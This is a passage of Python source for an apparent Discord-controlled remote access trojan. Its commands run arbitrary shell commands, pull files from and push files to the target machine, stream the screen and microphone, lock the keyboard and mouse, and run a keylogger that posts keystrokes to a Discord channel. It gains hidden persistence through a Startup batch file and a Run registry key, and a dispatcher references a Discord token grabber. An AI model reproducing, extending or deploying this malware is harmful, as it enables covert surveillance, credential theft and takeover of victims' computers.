            await ctx.send(f"🎤 Microphone streaming started. Connected to {voice_channel.name}.")
            
            # Play the audio source if voice client is available
            if voice_client:
                voice_client.play(discord.PCMAudio(source))
            
            # Keep the connection open while streaming
            while audio_streaming and voice_client and voice_client.is_connected():
                await asyncio.sleep(0.5)  # Check status every half second
                
            # Clean up resources
            if voice_client and voice_client.is_connected():
                if voice_client.is_playing():
                    voice_client.stop()
                await voice_client.disconnect()
                voice_client = None
                
            source.cleanup()
            audio_streaming = False
            await ctx.send("🎤 Microphone streaming ended.")
            
        except Exception as e:
            audio_streaming = False
            if voice_client and voice_client.is_connected():
                await voice_client.disconnect()
                voice_client = None
            await ctx.send(f"❌ Error in microphone streaming: {e}")

if IMAGEGRAB_AVAILABLE:
    @bot.command(name="screen")
    async def screen_command(ctx, action=None):
        """Stream the screen to the Discord channel"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global screen_streaming, streaming_task
        
        if action in ["off", "stop"]:
            if screen_streaming:
                screen_streaming = False
                if streaming_task:
                    streaming_task.cancel()
                    streaming_task = None
                await ctx.send("🖥️ Screen streaming stopped.")
            else:
                await ctx.send("❌ No screen streaming is active.")
            return
        
        # Check if already streaming
        if screen_streaming:
            await ctx.send("❌ Already streaming screen. Use `!screen stop` to stop.")
            return
        
        # Start screen streaming
        screen_streaming = True
        streaming_task = asyncio.create_task(stream_screen(ctx))
        await ctx.send("🖥️ Screen streaming started. Screenshots will be sent every 2 seconds.")

    async def stream_screen(ctx):
        """Capture and stream screen to Discord channel"""
        global screen_streaming
        
        try:
            counter = 0
            while screen_streaming:
                # Capture screen
                screenshot = ImageGrab.grab()
                imgbytes = io.BytesIO()
                screenshot.save(imgbytes, format='PNG')
                imgbytes.seek(0)
                
                # Send screenshot every 2 seconds
                counter += 1
                if counter % 2 == 0:  # Send every 2nd frame to avoid rate limits
                    file = discord.File(imgbytes, filename="screen.png")
                    
                    embed = discord.Embed(
                        title=f"Screen Capture from {COMPUTER_NAME}",
                        description=f"Captured at {datetime.datetime.now().strftime('%H:%M:%S')}",
                        color=discord.Color.blue(),
                        timestamp=datetime.datetime.now()
                    )
                    embed.set_image(url="attachment://screen.png")
                    
                    await ctx.send(file=file, embed=embed)
                
                # Sleep to limit frame rate
                await asyncio.sleep(1)
        
        except asyncio.CancelledError:
            logger.info("Screen streaming task cancelled.")
        except Exception as e:
            screen_streaming = False
            logger.error(f"Error in screen streaming: {e}")
            await ctx.send(f"❌ Error in screen streaming: {e}")

@bot.command(name="download")
async def download_command(ctx, *, file_path):
    """Download a file from the target computer"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    # Normalize and check file path
    file_path = os.path.expanduser(os.path.normpath(file_path))
    
    if not os.path.exists(file_path):
        await ctx.send(f"❌ File not found: {file_path}")
        return
    
    if not os.path.isfile(file_path):
        await ctx.send(f"❌ Path is not a file: {file_path}")
        return
    
    # Check file size (Discord has an 8MB limit for regular users)
    file_size = os.path.getsize(file_path)
    if file_size > 8 * 1024 * 1024:  # 8MB in bytes
        await ctx.send(f"❌ File is too large ({file_size / (1024*1024):.2f} MB). Discord has an 8MB file size limit.")
        return
    
    try:
        # Get file info
        file_name = os.path.basename(file_path)
        file_mod_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
        
        # Create an embed for file info
        embed = discord.Embed(
            title=f"File Download: {file_name}",
            description=f"Downloaded from: {file_path}",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(name="Size", value=f"{file_size / 1024:.2f} KB", inline=True)
        embed.add_field(name="Last Modified", value=file_mod_time.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
        
        # Send the file with the embed
        with open(file_path, 'rb') as file:
            discord_file = discord.File(file, filename=file_name)
            await ctx.send(file=discord_file, embed=embed)
    
    except Exception as e:
        await ctx.send(f"❌ Error downloading file: {e}")

@bot.command(name="upload")
async def upload_command(ctx):
    """Upload a file to the target computer"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    # Check if a file was attached
    if not ctx.message.attachments:
        await ctx.send("❌ No file attached. Please attach a file to upload.")
        return
    
    attachment = ctx.message.attachments[0]
    
    try:
        # Create uploads directory if it doesn't exist
        uploads_dir = os.path.join(os.path.expanduser("~"), "uploads")
        os.makedirs(uploads_dir, exist_ok=True)
        
        # Save the file
        file_path = os.path.join(uploads_dir, attachment.filename)
        await attachment.save(file_path)
        
        # Create an embed for confirmation
        embed = discord.Embed(
            title="File Upload Successful",
            description=f"File saved to: {file_path}",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(name="Filename", value=attachment.filename, inline=True)
        embed.add_field(name="Size", value=f"{attachment.size / 1024:.2f} KB", inline=True)
        
        await ctx.send(embed=embed)
    
    except Exception as e:
        await ctx.send(f"❌ Error uploading file: {e}")

@bot.command(name="execute")
async def execute_command(ctx, *, command):
    """Execute a command on the target system"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    try:
        # Create a status message
        status_message = await ctx.send(f"⏳ Executing command: `{command}`...")
        
        # Execute the command
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True
        )
        
        # Wait for command to complete with timeout
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30.0)
        except asyncio.TimeoutError:
            await status_message.edit(content=f"⚠️ Command execution timed out after 30 seconds: `{command}`")
            return
            
        # Decode output
        stdout_str = stdout.decode('utf-8', errors='replace').strip()
        stderr_str = stderr.decode('utf-8', errors='replace').strip()
        
        # Create an embed for the results
        embed = discord.Embed(
            title="Command Execution Results",
            description=f"Command: `{command}`",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(name="Exit Code", value=str(process.returncode), inline=False)
        
        # Add stdout if there is any
        if stdout_str:
            # Limit stdout to Discord's character limit
            if len(stdout_str) > 1000:
                stdout_str = stdout_str[:997] + "..."
            embed.add_field(name="Standard Output", value=f"```{stdout_str}```", inline=False)
        
        # Add stderr if there is any
        if stderr_str:
            # Limit stderr to Discord's character limit
            if len(stderr_str) > 1000:
                stderr_str = stderr_str[:997] + "..."
            embed.add_field(name="Standard Error", value=f"```{stderr_str}```", inline=False)
            
        # Update the status message with the results
        await status_message.edit(content=None, embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error executing command: {e}")

if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
    @bot.command(name="lock")
    async def lock_command(ctx, device_type):
        """Lock the keyboard or mouse"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global keyboard_locked, mouse_locked
        
        if device_type.lower() in ["key", "keyboard"]:
            if not keyboard_locked:
                keyboard_locked = True
                asyncio.create_task(block_keyboard())
                await ctx.send("🔒 Keyboard locked. All keyboard input will be blocked.")
            else:
                await ctx.send("❌ Keyboard is already locked.")
                
        elif device_type.lower() in ["mouse", "cursor"]:
            if not mouse_locked:
                mouse_locked = True
                asyncio.create_task(block_mouse())
                await ctx.send("🔒 Mouse locked. Mouse movement will be blocked.")
            else:
                await ctx.send("❌ Mouse is already locked.")
                
        else:
            await ctx.send("❌ Invalid device type. Use `!lock keyboard` or `!lock mouse`.")

    @bot.command(name="unlock")
    async def unlock_command(ctx, device_type):
        """Unlock the keyboard or mouse"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global keyboard_locked, mouse_locked
        
        if device_type.lower() in ["key", "keyboard"]:
            if keyboard_locked:
                keyboard_locked = False
                await ctx.send("🔓 Keyboard unlocked. Keyboard input is now available.")
            else:
                await ctx.send("❌ Keyboard is not locked.")
                
        elif device_type.lower() in ["mouse", "cursor"]:
            if mouse_locked:
                mouse_locked = False
                await ctx.send("🔓 Mouse unlocked. Mouse movement is now available.")
            else:
                await ctx.send("❌ Mouse is not locked.")
                
        else:
            await ctx.send("❌ Invalid device type. Use `!unlock keyboard` or `!unlock mouse`.")

    async def block_keyboard():
        """Block all keyboard input"""
        global keyboard_locked
        
        try:
            # Define keyboard event handlers
            def on_press(key):
                # Block all key presses
                return False
                
            def on_release(key):
                # Block all key releases
                return False
            
            # Create listener
            with KeyboardListener(on_press=on_press, on_release=on_release) as listener:
                while keyboard_locked:
                    await asyncio.sleep(0.1)
                    
                listener.stop()
                
        except Exception as e:
            logger.error(f"Error in keyboard blocking: {e}")

    async def block_mouse():
        """Block mouse movement"""
        global mouse_locked
        
        try:
            # Get current mouse position
            position = mouse_controller.position
            
            # Keep resetting to original position while locked
            while mouse_locked:
                mouse_controller.position = position
                await asyncio.sleep(0.01)  # Check frequently for responsiveness
                
        except Exception as e:
            logger.error(f"Error in mouse blocking: {e}")

    @bot.command(name="keylog")
    async def keylogger_command(ctx, action=None):
        """Start or stop a keylogger"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global keylogger_active, keylogger_channel, keylogger_buffer, keylogger_listener
        
        if action == "stop":
            if keylogger_active:
                keylogger_active = False
                if keylogger_listener:
                    keylogger_listener.stop()
                    keylogger_listener = None
                
                # Send any remaining keystrokes in the buffer
                if keylogger_buffer and keylogger_channel:
                    buffer_text = ''.join(keylogger_buffer)
                    if buffer_text:
                        await keylogger_channel.send(f"**Keylogger Final Buffer:**\n```\n{buffer_text}\n```")
                
                keylogger_buffer = []
                keylogger_channel = None
                await ctx.send("⌨️ Keylogger stopped.")
            else:
                await ctx.send("❌ No keylogger is active.")
            return
        
        # Check if keylogger is already active
        if keylogger_active:
            await ctx.send("❌ Keylogger is already active. Use `!keylog stop` to stop it.")
            return
        
        # Create a dedicated channel for the keylogger
        try:
            # Find the category for this computer
            category = None
            for guild in bot.guilds:
                category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
                if category:
                    break
            
            if not category:
                await ctx.send("❌ Could not find a category for this computer.")
                return
            
            # Create the keylogger channel
            timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
            channel_name = f"keylog-{COMPUTER_NAME.lower()}-{timestamp}"
            keylogger_channel = await category.create_text_channel(name=channel_name)
            
            # Start the keylogger
            keylogger_active = True
            keylogger_buffer = []
            
            # Create initial message
            await keylogger_channel.send(f"**Keylogger Started**\nTracking keystrokes from {COMPUTER_NAME} at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Start periodic sending task
            asyncio.create_task(periodic_send())
            
            # Define keyboard event handler
            def on_press(key):
                global keylogger_buffer
                
                try:
                    # Try to get the character
                    if hasattr(key, 'char'):
                        if key.char:
                            keylogger_buffer.append(key.char)
                    else:
                        # Handle special keys
                        if key == Key.space:
                            keylogger_buffer.append(' ')
                        elif key == Key.enter:
                            keylogger_buffer.append('\n')
                        elif key == Key.tab:
                            keylogger_buffer.append('\t')
                        elif key == Key.backspace:
                            if keylogger_buffer:
                                keylogger_buffer.pop()
                        else:
                            # Add special key name in brackets
                            keylogger_buffer.append(f'[{key}]')
                except Exception as e:
                    logger.error(f"Error processing keypress: {e}")
                
                # Only continue if keylogger is still active
                return keylogger_active
            
            # Start the listener
            keylogger_listener = KeyboardListener(on_press=on_press)
            keylogger_listener.start()
            
            # Send confirmation to user
            await ctx.send(f"⌨️ Keylogger started in channel: {keylogger_channel.mention}")
            
        except Exception as e:
            keylogger_active = False
            await ctx.send(f"❌ Error starting keylogger: {e}")

    async def send_keylog_buffer():
        """Send the current keylog buffer to the channel"""
        global keylogger_buffer, keylogger_channel
        
        if not keylogger_buffer or not keylogger_channel:
            return
        
        try:
            buffer_text = ''.join(keylogger_buffer)
            if buffer_text:
                await keylogger_channel.send(f"**Keystrokes:**\n```\n{buffer_text}\n```")
                keylogger_buffer = []  # Clear buffer after sending
        except Exception as e:
            logger.error(f"Error sending keylog buffer: {e}")

    async def periodic_send():
        """Periodically send keylogs to avoid losing data"""
        global keylogger_active
        
        try:
            while keylogger_active:
                await asyncio.sleep(10)  # Send every 10 seconds
                if keylogger_active:  # Check again after sleep
                    await send_keylog_buffer()
        except Exception as e:
            logger.error(f"Error in periodic keylog sending: {e}")

if platform.system() == "Windows" and WINREG_AVAILABLE:
    @bot.command(name="startup")
    async def startup_command(ctx):
        """Add the bot to Windows startup"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        try:
            # Get the current script path
            script_path = os.path.abspath(sys.argv[0])
            startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            
            # Create a batch file to run the script
            batch_path = os.path.join(startup_path, f"{PROCESS_NAME}.bat")
            
            with open(batch_path, "w") as batch_file:
                batch_file.write(f'@echo off\npythonw "{script_path}"\n')
            
            # Make the file hidden
            subprocess.run(["attrib", "+h", batch_path], check=True)
            
            # Create registry entry as backup method
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, PROCESS_NAME, 0, winreg.REG_SZ, f'pythonw "{script_path}"')
            
            # Add to the system PATH for easier access
            env_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment", 0, winreg.KEY_SET_VALUE)
            
            # Inform the user
            embed = discord.Embed(
                title="Startup Configuration Complete",
                description="The bot will now run automatically when the computer starts",
                color=discord.Color.green(),
                timestamp=datetime.datetime.now()
            )
            
            embed.add_field(name="Startup Method 1", value=f"Batch file: {batch_path}", inline=False)
            embed.add_field(name="Startup Method 2", value=f"Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{PROCESS_NAME}", inline=False)
            
            await ctx.send(embed=embed)
            
        except Exception as e:
            await ctx.send(f"❌ Error adding to startup: {e}")

    @bot.command(name="panic")
    async def panic_command(ctx):
        """Remove all traces of the bot from the system"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        try:
            # Send confirmation message first
            await ctx.send("🚨 **PANIC MODE ACTIVATED**\nRemoving all traces of the bot from the system...")
            
            # Remove startup entries
            startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            batch_path = os.path.join(startup_path, f"{PROCESS_NAME}.bat")
            
            if os.path.exists(batch_path):
                os.remove(batch_path)
            
            # Remove registry entries
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, PROCESS_NAME)
                winreg.CloseKey(key)
            except:
                pass  # Ignore if it doesn't exist
            
            # Final message
            await ctx.send("✅ **Cleanup Complete**\nAll traces of the bot have been removed from startup and registry. The bot will now exit.")
            
            # Exit the bot
            await bot.close()
            
        except Exception as e:
            await ctx.send(f"❌ Error in panic mode: {e}")

# Function to simulate Discord commands in test mode
async def simulate_commands():
    """Simulate running commands in test mode to demonstrate functionality"""
    print("\n===== SIMULATING DISCORD COMMANDS IN TEST MODE =====")
    print("Type '!help' to see available commands")
    print("Type '!exit' to quit the simulation")
    print("=========================================")
    
    # Creating a mock context for commands
    class MockMessage:
        def __init__(self, content, attachments=None):
            self.content = content
            self.attachments = attachments or []
            self.author = MockAuthor()
    
    class MockAttachment:
        def __init__(self, filename, size):
            self.filename = filename
            self.size = size
            
        async def save(self, path):
            print(f"[SIM] Saved attachment {self.filename} to {path}")
    
    class MockAuthor:
        def __init__(self):
            self.id = AUTHORIZED_USER_ID
            self.name = "TestUser"
            self.voice = None
    
    class MockChannel:
        async def send(self, content=None, embed=None, file=None):
            if content:
                print(f"\n[BOT] {content}")
            if embed:
                print(f"\n[EMBED] {embed.title}")
                if embed.description:
                    print(f"{embed.description}")
                for field in embed.fields:
                    value = field.value
                    # If value starts with || and ends with ||, it's a spoiler, show it as such
                    if value.startswith("||") and value.endswith("||"):
                        value = "[SPOILER CONTENT]"
                    print(f"- {field.name}: {value}")
            if file:
                print(f"[FILE] Sent file: {file.filename}")
            return MockMessage("Response")
        
        async def edit(self, content=None, embed=None):
            if content:
                print(f"\n[BOT EDIT] {content}")
            if embed:
                print(f"\n[EMBED EDIT] {embed.title}")
                if embed.description:
                    print(f"{embed.description}")
                for field in embed.fields:
                    print(f"- {field.name}: {field.value}")
            return self
    
    class MockContext:
        def __init__(self, message):
            self.message = message
            self.author = message.author
            self.channel = MockChannel()
            self.channel.id = 123456789
            self.send = self.channel.send
            self.guild = MockGuild()
            
    class MockCategory:
        def __init__(self, name):
            self.name = name
            
        async def create_text_channel(self, name):
            print(f"[SIM] Created text channel {name}")
            return MockChannel()
    
    class MockGuild:
        def __init__(self):
            self.categories = [MockCategory(COMPUTER_NAME)]
            self.text_channels = []
            
        async def create_category(self, name):
            print(f"[SIM] Created category {name}")
            category = MockCategory(name)
            self.categories.append(category)
            return category
    
    # Register our computer in the computer_channels dict
    computer_channels[123456789] = COMPUTER_NAME
    
    # Command loop
    while True:
        try:
            # Get user input
            cmd = input("\n> ")
            
            # Check for exit command
            if cmd.strip().lower() == "!exit":
                print("Exiting simulation...")
                break
                
            if not cmd.startswith("!"):
                print("Commands must start with !")
                continue
                
            # Create mock message and context
            message = MockMessage(cmd)
            ctx = MockContext(message)
            
            # Parse command and args
            parts = cmd.strip().split(" ", 1)
            command = parts[0][1:]  # Remove the ! prefix
            args = parts[1] if len(parts) > 1 else ""
            
            # Dispatch command
            if command == "help":
                await show_help(ctx)
            elif command == "info":
                await info_command(ctx)
            elif command == "discord":
                await discord_token_command(ctx)
            elif command == "download" and args:
                await download_command(ctx, file_path=args)
            elif command == "upload":
                # Simulate an attachment
                message.attachments = [MockAttachment("test_file.txt", 1024)]
                await upload_command(ctx)
            elif command == "execute" and args:
                await execute_command(ctx, command=args)
            elif command == "screen":
                if IMAGEGRAB_AVAILABLE:
                    await screen_command(ctx, action=args if args else None)
                else:
                    print("[SIM] Screen capture is not available")
            elif command == "lock" and args:
                if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
                    await lock_command(ctx, device_type=args)
                else:
                    print("[SIM] Keyboard/mouse control is not available")
            elif command == "unlock" and args:
                if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
                    await unlock_command(ctx, device_type=args)
                else:
                    print("[SIM] Keyboard/mouse control is not available")
            elif command == "keylog":
                if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
                    await keylogger_command(ctx, action=args if args else None)
                else:
                    print("[SIM] Keylogger is not available")
            elif command == "mic":
                if AUDIO_AVAILABLE:
                    await mic_command(ctx, action=args if args else None)
                else:
                    print("[SIM] Microphone streaming is not available")
            elif command == "startup":
                if platform.system() == "Windows" and WINREG_AVAILABLE:
                    await startup_command(ctx)
                else:
                    print("[SIM] Startup feature is only available on Windows")
            elif command == "panic":
                if platform.system() == "Windows" and WINREG_AVAILABLE:
                    await panic_command(ctx)
                else:
                    print("[SIM] Panic mode is only available on Windows")
            else:
                print(f"[SIM] Unknown command: {command}")
                
        except Exception as e:
            print(f"[SIM ERROR] {e}")

# Try to install system dependencies if possible
def try_install_system_dependencies():
    """Try to install system dependencies based on the current platform"""
    system = platform.system().lower()
    
    if system == "linux":
        # For Debian/Ubuntu-based systems
        try:
            # Check if we have sudo access (non-interactive)
            have_sudo = subprocess.run(["sudo", "-n", "true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0
            
            if have_sudo:
                print("Installing system dependencies (this may require your password)...")
                # Update package lists
                subprocess.run(["sudo", "apt-get", "update"], check=False)
                
                # Install required packages
                subprocess.run([
                    "sudo", "apt-get", "install", "-y",
                    "python3-dev", "portaudio19-dev", "libffi-dev",
                    "linux-headers-generic"
                ], check=False)
                
                print("System dependencies installed successfully!")
            else:
                print("No sudo access or sudo requires a password. Skipping system dependency installation.")
                print("If you encounter errors, you may need to manually install the following packages:")
                print("  sudo apt-get install python3-dev portaudio19-dev libffi-dev linux-headers-generic")
        except Exception as e:
            print(f"Error installing system dependencies: {e}")
            print("You may need to manually install the following packages:")
            print("  sudo apt-get install python3-dev portaudio19-dev libffi-dev linux-headers-generic")
    
    elif system == "darwin":  # macOS
        # Check if homebrew is installed
        have_brew = shutil.which("brew") is not None
        
        if have_brew:
            print("Installing system dependencies with Homebrew...")
            subprocess.run(["brew", "install", "portaudio"], check=False)
        else:
            print("Homebrew not found. Skipping system dependency installation.")
            print("If you encounter errors, you may need to install Homebrew and then run:")
            print("  brew install portaudio")
    
    elif system == "windows":
        print("On Windows, system dependencies are usually bundled with Python packages.")
        print("If you encounter errors, you may need to install Visual C++ Build Tools.")

# Run the bot
if __name__ == "__main__":
    # First check and install required packages
    install_required_packages()
    
    # Try to install system dependencies if needed
    try_install_system_dependencies()
    
    # Print available modules
    print(f"\nDiscord Bot Starting...")
    print(f"IMAGEGRAB_AVAILABLE: {IMAGEGRAB_AVAILABLE}")
    print(f"KEYBOARD_MOUSE_CONTROL_AVAILABLE: {KEYBOARD_MOUSE_CONTROL_AVAILABLE}")
    print(f"AUDIO_AVAILABLE: {AUDIO_AVAILABLE}")
    print(f"BROWSER_COOKIE_AVAILABLE: {BROWSER_COOKIE_AVAILABLE}")
    print(f"WINREG_AVAILABLE: {WINREG_AVAILABLE}")
    print(f"Operating System: {platform.system()}")
    print(f"Computer Name: {COMPUTER_NAME}")
    print(f"Command Prefix: {COMMAND_PREFIX}")
    
    if TOKEN == "REPLACE_WITH_BOT_TOKEN" or TEST_MODE:
        if TEST_MODE:
            print("\nRUNNING IN TEST MODE")
            print("This is a simulation to demonstrate bot functionality")
            print("No real Discord connection will be established")
            # Run the simulation
            asyncio.run(simulate_commands())
            sys.exit(0)
        else:
            print("\nWARNING: Bot token has not been set. Please set the DISCORD_BOT_TOKEN environment variable.")
            print("Running in TEST_MODE instead...")
            TEST_MODE = True
            # Run the simulation
            asyncio.run(simulate_commands())
            sys.exit(0)
        
    # Run the bot with real token
    bot.run(TOKEN)